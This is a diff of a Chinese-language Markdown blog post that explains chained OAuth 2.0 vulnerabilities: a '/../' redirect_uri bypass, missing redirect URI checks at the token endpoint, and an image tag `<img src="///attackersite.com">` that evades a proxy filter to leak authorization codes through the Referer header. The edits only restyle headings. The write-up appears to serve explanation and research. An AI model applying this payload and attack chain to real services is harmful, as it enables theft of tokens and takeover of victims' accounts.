@@ -159,13 +159,13 @@ OAuth 2.0中有6种常用的授权类型:
 
   仔细查找资料继续研究OAuth的问题发现以上这些坑都有了答案，便有了以下可利用方式
 
-  漏洞1：利用/../绕过redirect_uri 验证
+  **0x1漏洞1：利用/../绕过redirect_uri 验证**
 
   redirect_uri 验证：如果提供了的话，重定向URL的主机和端口必须严格匹配回调URL。重定向URL的路径**只能引用回调URL的一个子目录**。 
 
   在此情况下可进行尝试绕过，关于[redirect_uri重定向URL](http://homakov.blogspot.com/2013/03/redirecturi-is-achilles-heel-of-oauth.html)在很久之前曾有人发过博文。可见，关于OAuth很久以前便有了对此漏洞的利用攻击，已不再是一个新鲜的事了。
 
-  漏洞2：在获得令牌的终端缺少重定向URI验证
+  **0x2漏洞2：在获得令牌的终端缺少重定向URI验证**
 
   当然，仅有第一个漏洞没有什么价值。在OAuth2协议中有保护机制防止‘泄露的’重定向URI，每个code参数都签发给对应的‘redirect_uri’。要获得访问令牌必须提供你在认证流程中使用的准确的redirect_uri。 
 
@@ -175,7 +175,7 @@ OAuth 2.0中有6种常用的授权类型:
 
   组合：要是没有第一个漏洞，第二个漏洞也会要毫无价值。但是，它们却组合成一个很强大的漏洞——攻击者可以劫持一个签发给泄露的重定向uri的授权令牌，然后把这个泄露的令牌用在真正的客户端回调URl上，从而登陆受害者的账户。 
 
-  漏洞3. 在A.COM中注入跨站图片
+  **0x3漏洞3. 在A.COM中注入跨站图片**
 
   前面的攻击尝试就利用到了这一点，基本上，泄露的Referers有两个向量：用户点击一个链接（需要交互）或用户代理载入一些跨站资源，比如`<img> `,我不能简单的注入（img src=http://attackersite.com），因为这会替换成camo-proxy URL，这样就不能把Referer头传递到攻击者的主机。为了能够绕过Camo-s 过滤器，这里有一个小技巧：`<img src="///attackersite.com">`关于`///`可以参考[开放重定向漏洞进展](http://homakov.blogspot.com/2014/01/evolution-of-open-redirect-vulnerability.html)这篇文章。
 
